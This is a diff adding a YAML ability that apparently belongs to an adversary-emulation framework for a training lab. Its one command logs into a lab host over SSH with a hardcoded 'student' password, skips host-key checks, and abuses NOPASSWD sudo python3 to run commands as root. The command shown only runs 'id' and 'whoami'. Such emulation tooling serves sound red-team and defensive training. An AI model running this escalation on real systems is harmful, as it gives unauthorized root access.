@@ -1,0 +1,15 @@
+- id: priv01-sudo-python
+  name: SUDO Python3 Privilege Escalation
+  description: Escalate to root via NOPASSWD sudo python3
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.003
+    name: Abuse Elevation Control - Sudo
+  platforms:
+    linux:
+      sh:
+        command: |
+          sshpass -p 'student' ssh -o StrictHostKeyChecking=no student@10.0.20.21 "sudo python3 -c 'import os; os.system(\"id && whoami\")' " 2>/dev/null || echo 'Sudo privesc attempted'
+
+  singleton: false
+  repeatable: false
